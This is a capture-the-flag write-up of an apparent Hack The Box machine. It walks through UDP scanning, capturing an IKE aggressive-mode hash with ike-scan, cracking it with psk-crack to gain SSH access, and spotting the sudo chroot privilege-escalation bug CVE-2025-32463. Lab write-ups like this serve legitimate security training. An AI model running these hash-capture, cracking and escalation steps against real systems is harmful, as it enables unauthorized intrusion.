The Nmap scan shows only an SSH service running on port 22; nothing else.

Tried a few basic username-password combinations, but it was not of much use.

Tried running an UDP Nmap scan this time:-

```bash
nmap -p- -sU --min-rate=2000 -oN portlist 10.129.16.8

Okay! we have got a service named `isakmp` running on port 500

# IKE Enumeration

What is IKE?

As per, [https://www.paloaltonetworks.in](https://www.paloaltonetworks.in/), The Internet Key Exchange (IKE) protocol is used in IPsec VPNs to authenticate users and establish the shared key of a VPN session. IKE can operate in either main mode or aggressive mode. Main mode protects the identity of the user and securely establishes a shared secret for the VPN session. Users must provide a client certificate if connecting from a dynamic or non-whitelisted IP address. In aggressive mode the handshake takes less time, but the user's identity is transmitted in plaintext. The server responds with an MD5 or SHA1 hash of the user's password and information that is already sent in plaintext. An attacker could obtain the hash by intercepting packets or initiating an aggressive mode handshake with a valid username. 

There is a tool called `ike-scan` which is used to detect and identify IKE hosts and their implementations. Scanning the host with it:-

```bash
ike-scan -M -A 10.129.16.8                                        
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.098 seconds (10.20 hosts/sec).  1 returned handshake; 0 returned notify
```

We found an username `ike` , with aggressive mode enabled.

Let’s try to obtain the user’s password hash using an aggressive mode handshake

```bash
ike-scan -M -A 10.129.16.8 --id=ike@expressway.htb -P ike_hash.bin
WARNING: gethostbyname failed for "ike_hash.bin" - target ignored: Success

Ending ike-scan 1.9.6: 1 hosts scanned in 0.359 seconds (2.78 hosts/sec).  1 returned handshake; 0 returned notify

```

We have got the SHA1 password hash stored in `ike_hash.bin`.

Let us use `psk-crack` to crack this IKE hash, with the standard password wordlist `rockyou.txt`

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.bin
Starting psk-crack [ike-scan 1.9.6] ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash eac9112755d0d5dcc6815cbf932b8e02fbdf303a
Ending psk-crack: 8045040 iterations in 6.100 seconds (1318803.24 iterations/sec)
```

Password for user `ike` obtained: `freakingrockstarontheroad`

Now we can ssh into the machine as `ike` and claim the user flag.

# Privilege Escalation

Trying `sudo -l` yields us no results as `ike` is not permitted to run as `sudo` on the machine.

Let us search for SUID binaries on the system:-

```bash
ike@expressway:~$ find / -type f -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

There’s something weird here, the `sudo` binary is present in a non-standard location. This might indicate that it was custom-installed or modified in some way.

Checking the version of `sudo` on the machine:-

```bash
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Let’s search if there is any vulnerability associated with this version of `sudo`

![img/Expressway/Screenshot 2026-01-20 192112.png](img/Expressway/image%202.png)

There’s a privilege escalation vulnerability associated with this version of `sudo`

## CVE-2025-32463

According to h[ttps://www.rapid7.com/db/modules/exploit/linux/local/sudo_chroot_cve_2025_32463/](https://www.rapid7.com/db/modules/exploit/linux/local/sudo_chroot_cve_2025_32463/), `sudo` before version 1.19.17p1 allows a user to use `chroot` option, when executing command. The option is intended to run a command with user-selected root directory (if sudoers file allow it). Change in version 1.9.14 allows resolving paths via `chroot` using user-specified root directory when sudoers is still evaluating. This allows the attacker to trick Sudo into loading arbitrary shared object, thus resulting in a privilege escalation.

# Learnings

- Always scan for services which run on all types of connections (TCP, UDP …)
- Custom error messages, custom file paths all indicate non-standard behaviour
